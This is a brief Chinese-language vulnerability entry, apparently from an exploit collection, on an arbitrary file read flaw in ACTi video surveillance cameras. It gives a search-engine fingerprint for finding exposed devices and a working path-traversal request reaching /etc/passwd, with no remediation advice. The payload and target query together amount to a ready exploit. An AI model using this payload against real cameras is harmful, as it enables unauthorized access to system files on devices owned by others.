# ACTI 视频监控 images 任意文件读取漏洞

## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

```
ACTI摄像头
```

## 网络测绘

```
app="ACTi-视频监控"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326122456730.png)

使用Burp抓包

```plain
/images/../../../../../../../../etc/passwd
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326122456731.png)
